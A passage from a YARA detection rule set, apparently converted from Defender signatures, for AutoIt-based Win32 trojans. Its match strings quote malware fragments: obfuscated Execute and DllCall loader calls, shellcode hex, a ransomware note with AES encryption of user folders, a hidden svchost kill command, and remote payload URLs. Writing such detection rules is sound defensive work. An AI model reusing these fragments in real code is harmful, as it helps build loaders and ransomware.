        author = "defender2yara"
        detection_name = "Trojan:Win32/AutoitInject.KTAA!MTB"
        threat_id = "2147908315"
        type = "Trojan"
        platform = "Win32: Windows 32-bit platform"
        family = "AutoitInject"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_AUTOITHSTR_EXT"
        threshold = "13"
        strings_accuracy = "High"
    strings:
        $x_2_1 = "SHELLEXECUTE ( \"chrome.exe\" , \"https://www" ascii //weight: 2
        $x_2_2 = "SLEEP ( 2000 )" ascii //weight: 2
        $x_2_3 = "SLEEP ( 500 )" ascii //weight: 2
        $x_1_4 = "STRINGSPLIT (" ascii //weight: 1
        $x_1_5 = "BITOR ( BITSHIFT" ascii //weight: 1
        $x_1_6 = "00EB0231C021C07502EB07B801000000EB0231C021C0740731C0E969010000C7" ascii //weight: 1
        $x_1_7 = "EB05B80100000021C07502EB07B801000000EB0231C021C07502EB07B8010000" ascii //weight: 1
        $x_1_8 = "TRACKMOUSEEVENT (" ascii //weight: 1
        $x_1_9 = "OPT ( \"MouseCoordMode\" ," ascii //weight: 1
        $x_1_10 = "REGREAD ( \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders\"" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win32_AutoitInject_LYAA_2147909346_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win32/AutoitInject.LYAA!MTB"
        threat_id = "2147909346"
        type = "Trojan"
        platform = "Win32: Windows 32-bit platform"
        family = "AutoitInject"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_AUTOITHSTR_EXT"
        threshold = "12"
        strings_accuracy = "High"
    strings:
        $x_2_1 = "EXECUTE ( \"@tempdir\" )" ascii //weight: 2
        $x_2_2 = "EXECUTE ( \"F\" & \"i\" & \"l\" & \"e\" & \"R\" & \"e\" & \"a\" & \"d\" & \"(F\" & \"il\" & \"e\" & \"O\" & \"p\" & \"e\" & \"n\" & \"(\" & " ascii //weight: 2
        $x_2_3 = "t\" & \"e\" & \"m\" & \"p\" & \"d\" & \"i\" & \"r" ascii //weight: 2
        $x_2_4 = "EXECUTE ( \"S\" & \"t\" & \"r\" & \"i\" & \"n\" & \"g\" & \"R\" & \"e\" & \"pl\" & \"ac\" & \"e" ascii //weight: 2
        $x_1_5 = "( 216 + -109 )" ascii //weight: 1
        $x_1_6 = "( 977 + -876 )" ascii //weight: 1
        $x_1_7 = "( 511 + -397 )" ascii //weight: 1
        $x_1_8 = "( 460 + -350 )" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win32_AutoitInject_MPAA_2147910169_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win32/AutoitInject.MPAA!MTB"
        threat_id = "2147910169"
        type = "Trojan"
        platform = "Win32: Windows 32-bit platform"
        family = "AutoitInject"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_AUTOITHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_2_1 = "PUmgHoIBc\\PUmgHoIBc.exe" ascii //weight: 2
        $x_1_2 = "PUmgHoIBc\\y2mate.com" ascii //weight: 1
        $x_1_3 = "SHELLEXECUTE (" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win32_AutoitInject_SZ_2147910546_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win32/AutoitInject.SZ!MTB"
        threat_id = "2147910546"
        type = "Trojan"
        platform = "Win32: Windows 32-bit platform"
        family = "AutoitInject"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_AUTOITHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {46 00 49 00 4c 00 45 00 49 00 4e 00 53 00 54 00 41 00 4c 00 4c 00 20 00 28 00 20 00 22 00 [0-47] 22 00 20 00 2c 00 20 00 45 00 58 00 45 00 43 00 55 00 54 00 45 00 20 00 28 00 20 00 22 00 40 00 74 00 65 00 6d 00 70 00 64 00 69 00 72 00 22 00 20 00 29 00 20 00 26 00 20 00 22 00 5c 00 00 22 00 20 00 2c 00 20 00 31 00 20 00 29 00}  //weight: 1, accuracy: Low
        $x_1_2 = {46 49 4c 45 49 4e 53 54 41 4c 4c 20 28 20 22 [0-47] 22 20 2c 20 45 58 45 43 55 54 45 20 28 20 22 40 74 65 6d 70 64 69 72 22 20 29 20 26 20 22 5c 00 22 20 2c 20 31 20 29}  //weight: 1, accuracy: Low
        $x_1_3 = {3d 00 20 00 46 00 49 00 4c 00 45 00 52 00 45 00 41 00 44 00 20 00 28 00 20 00 46 00 49 00 4c 00 45 00 4f 00 50 00 45 00 4e 00 20 00 28 00 20 00 40 00 54 00 45 00 4d 00 50 00 44 00 49 00 52 00 20 00 26 00 20 00 22 00 5c 00 [0-47] 22 00 20 00 29 00 20 00 29 00}  //weight: 1, accuracy: Low
        $x_1_4 = {3d 20 46 49 4c 45 52 45 41 44 20 28 20 46 49 4c 45 4f 50 45 4e 20 28 20 40 54 45 4d 50 44 49 52 20 26 20 22 5c [0-47] 22 20 29 20 29}  //weight: 1, accuracy: Low
        $x_1_5 = {46 00 4f 00 52 00 20 00 24 00 [0-47] 20 00 3d 00 20 00 31 00 20 00 54 00 4f 00 20 00 53 00 54 00 52 00 49 00 4e 00 47 00 4c 00 45 00 4e 00 20 00 28 00 20 00 24 00 [0-47] 20 00 29 00}  //weight: 1, accuracy: Low
        $x_1_6 = {46 4f 52 20 24 [0-47] 20 3d 20 31 20 54 4f 20 53 54 52 49 4e 47 4c 45 4e 20 28 20 24 [0-47] 20 29}  //weight: 1, accuracy: Low
        $x_1_7 = "CHR ( BITXOR ( ASC ( STRINGMID" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (4 of ($x*))
}

rule Trojan_Win32_AutoitInject_SZ_2147910546_1
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win32/AutoitInject.SZ!MTB"
        threat_id = "2147910546"
        type = "Trojan"
        platform = "Win32: Windows 32-bit platform"
        family = "AutoitInject"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_AUTOITHSTR_EXT"
        threshold = "6"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {46 00 49 00 4c 00 45 00 49 00 4e 00 53 00 54 00 41 00 4c 00 4c 00 20 00 28 00 20 00 22 00 [0-20] 22 00 20 00 2c 00 20 00 40 00 54 00 45 00 4d 00 50 00 44 00 49 00 52 00 20 00 26 00 20 00 22 00 5c 00 [0-20] 22 00 20 00 2c 00 20 00 31 00 20 00 29 00}  //weight: 1, accuracy: Low
        $x_1_2 = {46 49 4c 45 49 4e 53 54 41 4c 4c 20 28 20 22 [0-20] 22 20 2c 20 40 54 45 4d 50 44 49 52 20 26 20 22 5c [0-20] 22 20 2c 20 31 20 29}  //weight: 1, accuracy: Low
        $x_2_3 = "CALL ( \"Dl\" & \"lCall\"" ascii //weight: 2
        $x_2_4 = {43 00 41 00 4c 00 4c 00 20 00 28 00 20 00 22 00 53 00 74 00 22 00 20 00 26 00 20 00 22 00 72 00 69 00 6e 00 67 00 53 00 22 00 20 00 26 00 20 00 22 00 70 00 6c 00 69 00 74 00 22 00 20 00 2c 00 20 00 24 00 [0-20] 20 00 2c 00 20 00 22 00 27 00 20 00 26 00 20 00 27 00 20 00 22 00 20 00 2c 00 20 00 32 00 20 00 29 00}  //weight: 2, accuracy: Low
        $x_2_5 = {43 41 4c 4c 20 28 20 22 53 74 22 20 26 20 22 72 69 6e 67 53 22 20 26 20 22 70 6c 69 74 22 20 2c 20 24 [0-20] 20 2c 20 22 27 20 26 20 27 20 22 20 2c 20 32 20 29}  //weight: 2, accuracy: Low
        $x_1_6 = {28 00 20 00 22 00 44 00 6c 00 22 00 20 00 26 00 20 00 22 00 6c 00 53 00 74 00 72 00 75 00 63 00 74 00 53 00 65 00 74 00 22 00 20 00 26 00 20 00 22 00 44 00 61 00 74 00 61 00 22 00 20 00 2c 00 20 00 24 00 [0-20] 20 00 2c 00 20 00 31 00 20 00 2c 00 20 00 24 00 [0-20] 20 00 29 00}  //weight: 1, accuracy: Low
        $x_1_7 = {28 20 22 44 6c 22 20 26 20 22 6c 53 74 72 75 63 74 53 65 74 22 20 26 20 22 44 61 74 61 22 20 2c 20 24 [0-20] 20 2c 20 31 20 2c 20 24 [0-20] 20 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (
            ((1 of ($x_2_*) and 4 of ($x_1_*))) or
            ((2 of ($x_2_*) and 2 of ($x_1_*))) or
            ((3 of ($x_2_*))) or
            (all of ($x*))
        )
}

rule Trojan_Win32_AutoitInject_NTAA_2147911490_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win32/AutoitInject.NTAA!MTB"
        threat_id = "2147911490"
        type = "Trojan"
        platform = "Win32: Windows 32-bit platform"
        family = "AutoitInject"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_AUTOITHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "EXECUTE ( \"C\" & \"h\" & \"r(B\" & \"i\" & \"t\" & \"X\" & \"O\" & \"R(A\" & \"s\" & \"c(St\" & \"r\" & \"i\" & \"n\" & \"g\" & \"M\" & \"i\" & \"d" ascii //weight: 1
        $x_1_2 = "EXECUTE ( \"F\" & \"ileRe\" & \"ad(FileO\" & \"pen(@\" & \"te\" & \"mp\" & \"dir" ascii //weight: 1
        $x_1_3 = "EXECUTE ( \"S\" & \"tr\" & \"ing\" & \"Re\" & \"pla\" & \"ce" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win32_AutoitInject_ODAA_2147911933_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win32/AutoitInject.ODAA!MTB"
        threat_id = "2147911933"
        type = "Trojan"
        platform = "Win32: Windows 32-bit platform"
        family = "AutoitInject"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_AUTOITHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "EXECUTE ( \"F\" & \"ileRe\" & \"ad(FileO\" & \"pen(@\" & \"te\" & \"mp\" & \"dir" ascii //weight: 1
        $x_1_2 = "EXECUTE ( \"S\" & \"t\" & \"r\" & \"i\" & \"n\" & \"g\" & \"R\" & \"e\" & \"p\" & \"l\" & \"a\" & \"c\" & \"e" ascii //weight: 1
        $x_1_3 = "EXECUTE ( \"C\" & \"h\" & \"r(B\" & \"i\" & \"t\" & \"X\" & \"O\" & \"R(A\" & \"s\" & \"c(St\" & \"r\" & \"i\" & \"n\" & \"g\" & \"M\" & \"i\" & \"d" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win32_AutoitInject_OKAA_2147912176_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win32/AutoitInject.OKAA!MTB"
        threat_id = "2147912176"
        type = "Trojan"
        platform = "Win32: Windows 32-bit platform"
        family = "AutoitInject"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_AUTOITHSTR_EXT"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_4_1 = "[ 2 ] = [ \"PUmgHoIBc\\PUmgHoIBc.exe\" , \"PUmgHoIBc" ascii //weight: 4
        $x_1_2 = "SHELLEXECUTE ( @WORKINGDIR" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win32_AutoitInject_OWAA_2147912500_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win32/AutoitInject.OWAA!MTB"
        threat_id = "2147912500"
        type = "Trojan"
        platform = "Win32: Windows 32-bit platform"
        family = "AutoitInject"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_AUTOITHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "ENVGET ( \"TEMP\" ) &" ascii //weight: 1
        $x_1_2 = "EXECUTE ( \"FileRead(FileOpen(EnvGet(\"\"TEMP\"\")  &" ascii //weight: 1
        $x_1_3 = "EXECUTE ( \"D\" & \"l\" & \"l\" & \"C\" & \"a\" & \"l\" & \"l" ascii //weight: 1
        $x_1_4 = "&= CHR ( BITXOR ( ASC ( STRINGMID" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win32_AutoitInject_PFAA_2147912752_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win32/AutoitInject.PFAA!MTB"
        threat_id = "2147912752"
        type = "Trojan"
        platform = "Win32: Windows 32-bit platform"
        family = "AutoitInject"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_AUTOITHSTR_EXT"
        threshold = "8"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "&= CHR ( ASC ( STRINGMID" ascii //weight: 1
        $x_1_2 = "EXECUTE ( \"Stri\" & \"ngLe\" & \"ft" ascii //weight: 1
        $x_1_3 = "@TEMPDIR &" ascii //weight: 1
        $x_1_4 = "EXECUTE ( \"Fil\" & \"eRe\" & \"ad(Fil\" & \"eOp\" & \"en(@Tem\" & \"pDir &" ascii //weight: 1
        $x_1_5 = "EXECUTE ( \"DllC\" & \"all" ascii //weight: 1
        $x_1_6 = "EXECUTE ( \"DllStruc\" & \"tCreate" ascii //weight: 1
        $x_1_7 = "EXECUTE ( \"DllS\" & \"tru\" & \"ctSe\" & \"tDat\" & \"a" ascii //weight: 1
        $x_1_8 = "EXECUTE ( \"Dl\" & \"lCall\" & \"Add\" & \"ress(\"\"in\"\" & \"\"t\"\"" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win32_AutoitInject_PKAA_2147913667_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win32/AutoitInject.PKAA!MTB"
        threat_id = "2147913667"
        type = "Trojan"
        platform = "Win32: Windows 32-bit platform"
        family = "AutoitInject"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_AUTOITHSTR_EXT"
        threshold = "15"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "= @TEMPDIR" ascii //weight: 1
        $x_1_2 = "&= CHR ( RANDOM ( 97 , 122 , 1 ) )" ascii //weight: 1
        $x_1_3 = "= \"Crnaptica2!\"" ascii //weight: 1
        $x_1_4 = "MSGBOX ( 0 , \"Flow's Encryption\" , \"Your files has been encrypted, contact me on discord for more info: flow#1337\" )" ascii //weight: 1
        $x_1_5 = "_CRYPT_ENCRYPTFILE ( $FILE , $FILE & \".flowEncryption\" , $KEY , $CALG_AES_256 )" ascii //weight: 1
        $x_1_6 = "= DRIVEGETDRIVE" ascii //weight: 1
        $x_1_7 = "( @USERPROFILEDIR & \"\\Downloads\" )" ascii //weight: 1
        $x_1_8 = "( @USERPROFILEDIR & \"\\Pictures\" )" ascii //weight: 1
        $x_1_9 = "( @USERPROFILEDIR & \"\\Music\" )" ascii //weight: 1
        $x_1_10 = "( @USERPROFILEDIR & \"\\Videos\" )" ascii //weight: 1
        $x_1_11 = "( @USERPROFILEDIR & \"\\Documents\" )" ascii //weight: 1
        $x_1_12 = "( @USERPROFILEDIR & \"\\AppData\" )" ascii //weight: 1
        $x_1_13 = "( @USERPROFILEDIR & \"\\\" )" ascii //weight: 1
        $x_1_14 = "( \"C:\\\" & \"\\\" )" ascii //weight: 1
        $x_1_15 = "( @DESKTOPDIR )" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win32_AutoitInject_AMAD_2147915080_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win32/AutoitInject.AMAD!MTB"
        threat_id = "2147915080"
        type = "Trojan"
        platform = "Win32: Windows 32-bit platform"
        family = "AutoitInject"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_AUTOITHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "RUN ( @COMSPEC & \" /c \" & \"taskkill /f /im svchost.exe\" , \"\" , @SW_HIDE )" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win32_AutoitInject_PHAA_2147915226_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win32/AutoitInject.PHAA!MTB"
        threat_id = "2147915226"
        type = "Trojan"
        platform = "Win32: Windows 32-bit platform"
        family = "AutoitInject"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_AUTOITHSTR_EXT"
        threshold = "8"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "BITOR (" ascii //weight: 1
        $x_1_2 = "STRINGSPLIT ( $URLS , \",\" , 2 )" ascii //weight: 1
        $x_1_3 = "SHELLEXECUTE (" ascii //weight: 1
        $x_1_4 = "_DOWNLOADFILE ( $" ascii //weight: 1
        $x_1_5 = "STRINGREGEXPREPLACE ( $SURL , \"^.*/\" , \"\" )" ascii //weight: 1
        $x_1_6 = "@TEMPDIR & \"/\" & $SFILE" ascii //weight: 1
        $x_1_7 = "INETGET ( $SURL , $SDIRECTORY , 17 , 1 )" ascii //weight: 1
        $x_1_8 = "INETCLOSE (" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win32_AutoitInject_SAUY_2147915594_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win32/AutoitInject.SAUY!MTB"
        threat_id = "2147915594"
        type = "Trojan"
        platform = "Win32: Windows 32-bit platform"
        family = "AutoitInject"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_AUTOITHSTR_EXT"
        threshold = "6"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "= BITOR ( $FILE_SHARE_READ , $FILE_SHARE_WRITE , $FILE_SHARE_DELETE )" ascii //weight: 1
        $x_1_2 = ".GenerateExecutable = ( STRINGRIGHT ( $SFILENAME , 4 ) = \".exe\" )" ascii //weight: 1
        $x_1_3 = "\"054831C0EB0748C7C0010000004821C07502EB0948C7C001000000EB034831C0\" & \"4821C074084831C04863C0EB7748C744242800000000" ascii //weight: 1
        $x_1_4 = "( STRINGLEFT ( $SHEX , 2 ) == \"0x\" ) THEN $SHEX = \"0x\" & $SHEX" ascii //weight: 1
        $x_1_5 = {3d 00 20 00 5f 00 48 00 45 00 58 00 54 00 4f 00 53 00 54 00 52 00 49 00 4e 00 47 00 20 00 28 00 20 00 22 00 30 00 78 00 [0-63] 22 00 20 00 26 00 20 00 22 00 [0-63] 22 00 20 00 26 00 20 00 22 00 [0-63] 22 00 20 00 26 00 20 00 22 00 [0-63] 22 00}  //weight: 1, accuracy: Low
        $x_1_6 = {3d 20 5f 48 45 58 54 4f 53 54 52 49 4e 47 20 28 20 22 30 78 [0-63] 22 20 26 20 22 [0-63] 22 20 26 20 22 [0-63] 22 20 26 20 22 [0-63] 22}  //weight: 1, accuracy: Low
        $x_1_7 = "\"3B7C24287C4F4C8B7C24604C037C24284C897C2430488B6C2430807D00007405\" & \"4831C0EB0748C7C0010000004821C0741C4C8B7C2468" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (6 of ($x*))
}

rule Trojan_Win32_AutoitInject_SKAI_2147915990_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win32/AutoitInject.SKAI!MTB"
        threat_id = "2147915990"
        type = "Trojan"
        platform = "Win32: Windows 32-bit platform"
        family = "AutoitInject"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_AUTOITHSTR_EXT"
        threshold = "6"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {46 00 49 00 4c 00 45 00 57 00 52 00 49 00 54 00 45 00 [0-10] 20 00 28 00 20 00 [0-42] 20 00 2c 00 20 00 22 00 [0-42] 22 00 20 00 29 00}  //weight: 1, accuracy: Low
        $x_1_2 = {46 49 4c 45 57 52 49 54 45 [0-10] 20 28 20 [0-42] 20 2c 20 22 [0-42] 22 20 29}  //weight: 1, accuracy: Low
        $x_1_3 = {52 00 45 00 47 00 57 00 52 00 49 00 54 00 45 00 20 00 28 00 20 00 22 00 [0-42] 22 00 20 00 2c 00 20 00 [0-42] 20 00 2c 00 20 00 [0-42] 20 00 2c 00 20 00 [0-42] 20 00 29 00}  //weight: 1, accuracy: Low
        $x_1_4 = {52 45 47 57 52 49 54 45 20 28 20 22 [0-42] 22 20 2c 20 [0-42] 20 2c 20 [0-42] 20 2c 20 [0-42] 20 29}  //weight: 1, accuracy: Low
        $x_1_5 = {52 00 45 00 47 00 44 00 45 00 4c 00 45 00 54 00 45 00 20 00 28 00 20 00 24 00 [0-46] 20 00 2c 00 20 00 22 00 [0-46] 22 00 20 00 29 00}  //weight: 1, accuracy: Low
        $x_1_6 = {52 45 47 44 45 4c 45 54 45 20 28 20 24 [0-46] 20 2c 20 22 [0-46] 22 20 29}  //weight: 1, accuracy: Low
        $x_1_7 = {45 00 58 00 45 00 43 00 55 00 54 00 45 00 20 00 28 00 20 00 22 00 [0-42] 22 00 20 00 29 00}  //weight: 1, accuracy: Low
        $x_1_8 = {45 58 45 43 55 54 45 20 28 20 22 [0-42] 22 20 29}  //weight: 1, accuracy: Low
        $x_1_9 = {46 00 49 00 4c 00 45 00 49 00 4e 00 53 00 54 00 41 00 4c 00 4c 00 20 00 28 00 20 00 22 00 [0-47] 22 00 20 00 2c 00 20 00 40 00 54 00 45 00 4d 00 50 00 44 00 49 00 52 00 20 00 26 00 20 00 22 00 5c 00 00 22 00 20 00 2c 00 20 00 31 00 20 00 29 00}  //weight: 1, accuracy: Low
        $x_1_10 = {46 49 4c 45 49 4e 53 54 41 4c 4c 20 28 20 22 [0-47] 22 20 2c 20 40 54 45 4d 50 44 49 52 20 26 20 22 5c 00 22 20 2c 20 31 20 29}  //weight: 1, accuracy: Low
        $x_1_11 = {3d 00 20 00 45 00 58 00 45 00 43 00 55 00 54 00 45 00 20 00 28 00 20 00 22 00 42 00 69 00 74 00 58 00 4f 00 52 00 28 00 [0-47] 2c 00 20 00 [0-47] 20 00 2b 00}  //weight: 1, accuracy: Low
        $x_1_12 = {3d 20 45 58 45 43 55 54 45 20 28 20 22 42 69 74 58 4f 52 28 [0-47] 2c 20 [0-47] 20 2b}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (6 of ($x*))
}

rule Trojan_Win32_AutoitInject_RVAA_2147916311_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win32/AutoitInject.RVAA!MTB"
        threat_id = "2147916311"
        type = "Trojan"
        platform = "Win32: Windows 32-bit platform"
        family = "AutoitInject"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_AUTOITHSTR_EXT"
        threshold = "7"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "$TEMPFOLDER & \"\\s\"" ascii //weight: 1
        $x_1_2 = "$TEMPFOLDER & \"\\Tx.pif\"" ascii //weight: 1
        $x_1_3 = "DOWNLOADTEXTFROMURL ( $URL )" ascii //weight: 1
        $x_2_4 = "https://nkprotect.net/Ho.txt" ascii //weight: 2
        $x_2_5 = "https://nkprotect.net/Tx.pif" ascii //weight: 2
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win32_AutoitInject_SAU_2147916387_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win32/AutoitInject.SAU!MTB"
        threat_id = "2147916387"
        type = "Trojan"
        platform = "Win32: Windows 32-bit platform"
        family = "AutoitInject"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_AUTOITHSTR_EXT"
        threshold = "7"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {46 00 49 00 4c 00 45 00 57 00 52 00 49 00 54 00 45 00 [0-10] 20 00 28 00 20 00 [0-42] 20 00 2c 00 20 00 22 00 [0-42] 22 00 20 00 29 00}  //weight: 1, accuracy: Low
        $x_1_2 = {46 49 4c 45 57 52 49 54 45 [0-10] 20 28 20 [0-42] 20 2c 20 22 [0-42] 22 20 29}  //weight: 1, accuracy: Low
        $x_1_3 = {52 00 45 00 47 00 57 00 52 00 49 00 54 00 45 00 20 00 28 00 20 00 22 00 [0-42] 22 00 20 00 2c 00 20 00 [0-42] 20 00 2c 00 20 00 [0-42] 20 00 2c 00 20 00 [0-42] 20 00 29 00}  //weight: 1, accuracy: Low
        $x_1_4 = {52 45 47 57 52 49 54 45 20 28 20 22 [0-42] 22 20 2c 20 [0-42] 20 2c 20 [0-42] 20 2c 20 [0-42] 20 29}  //weight: 1, accuracy: Low
        $x_1_5 = {52 00 45 00 47 00 44 00 45 00 4c 00 45 00 54 00 45 00 20 00 28 00 20 00 22 00 [0-46] 22 00 20 00 2c 00 20 00 [0-47] 20 00 29 00}  //weight: 1, accuracy: Low
        $x_1_6 = {52 45 47 44 45 4c 45 54 45 20 28 20 22 [0-46] 22 20 2c 20 [0-47] 20 29}  //weight: 1, accuracy: Low
        $x_1_7 = {45 00 58 00 45 00 43 00 55 00 54 00 45 00 20 00 28 00 20 00 22 00 [0-42] 22 00 20 00 29 00}  //weight: 1, accuracy: Low
        $x_1_8 = {45 58 45 43 55 54 45 20 28 20 22 [0-42] 22 20 29}  //weight: 1, accuracy: Low
        $x_1_9 = {46 00 49 00 4c 00 45 00 49 00 4e 00 53 00 54 00 41 00 4c 00 4c 00 20 00 28 00 20 00 22 00 [0-47] 22 00 20 00 2c 00 20 00 40 00 54 00 45 00 4d 00 50 00 44 00 49 00 52 00 20 00 26 00 20 00 22 00 5c 00 00 22 00 20 00 2c 00 20 00 31 00 20 00 29 00}  //weight: 1, accuracy: Low
        $x_1_10 = {46 49 4c 45 49 4e 53 54 41 4c 4c 20 28 20 22 [0-47] 22 20 2c 20 40 54 45 4d 50 44 49 52 20 26 20 22 5c 00 22 20 2c 20 31 20 29}  //weight: 1, accuracy: Low
        $x_1_11 = {3d 00 20 00 45 00 58 00 45 00 43 00 55 00 54 00 45 00 20 00 28 00 20 00 22 00 42 00 69 00 74 00 58 00 4f 00 52 00 28 00 [0-47] 2c 00 20 00 [0-47] 20 00 2b 00}  //weight: 1, accuracy: Low
        $x_1_12 = {3d 20 45 58 45 43 55 54 45 20 28 20 22 42 69 74 58 4f 52 28 [0-47] 2c 20 [0-47] 20 2b}  //weight: 1, accuracy: Low
        $x_1_13 = {3d 00 20 00 45 00 58 00 45 00 43 00 55 00 54 00 45 00 20 00 28 00 20 00 22 00 44 00 6c 00 6c 00 43 00 61 00 6c 00 6c 00 28 00 22 00 22 00 6b 00 65 00 72 00 6e 00 65 00 6c 00 33 00 32 00 22 00 22 00 2c 00 20 00 22 00 22 00 70 00 74 00 72 00 22 00 22 00 2c 00 20 00 22 00 22 00 56 00 69 00 72 00 74 00 75 00 61 00 6c 00 41 00 6c 00 6c 00 6f 00 63 00 22 00 22 00 2c 00 20 00 22 00 22 00 64 00 77 00 6f 00 72 00 64 00 22 00 22 00 2c 00 20 00 22 00 22 00 30 00 22 00 22 00 2c 00 20 00 22 00 22 00 64 00 77 00 6f 00 72 00 64 00 22 00 22 00 2c 00 20 00 42 00 69 00 6e 00 61 00 72 00 79 00 4c 00 65 00 6e 00 28 00 24 00 [0-47] 29 00 2c 00}  //weight: 1, accuracy: Low
        $x_1_14 = {3d 20 45 58 45 43 55 54 45 20 28 20 22 44 6c 6c 43 61 6c 6c 28 22 22 6b 65 72 6e 65 6c 33 32 22 22 2c 20 22 22 70 74 72 22 22 2c 20 22 22 56 69 72 74 75 61 6c 41 6c 6c 6f 63 22 22 2c 20 22 22 64 77 6f 72 64 22 22 2c 20 22 22 30 22 22 2c 20 22 22 64 77 6f 72 64 22 22 2c 20 42 69 6e 61 72 79 4c 65 6e 28 24 [0-47] 29 2c}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (7 of ($x*))
}

rule Trojan_Win32_AutoitInject_KAD_2147917511_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win32/AutoitInject.KAD!MTB"
        threat_id = "2147917511"
        type = "Trojan"
        platform = "Win32: Windows 32-bit platform"
        family = "AutoitInject"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_AUTOITHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {46 00 49 00 4c 00 45 00 49 00 4e 00 53 00 54 00 41 00 4c 00 4c 00 20 00 28 00 20 00 22 00 [0-30] 22 00 20 00 2c 00 20 00 45 00 4e 00 56 00 47 00 45 00 54 00 20 00 28 00 20 00 22 00 [0-40] 22 00 20 00 29 00 20 00 26 00 20 00 22 00 [0-30] 22 00 20 00 2c 00 20 00 31 00 20 00 29 00}  //weight: 1, accuracy: Low
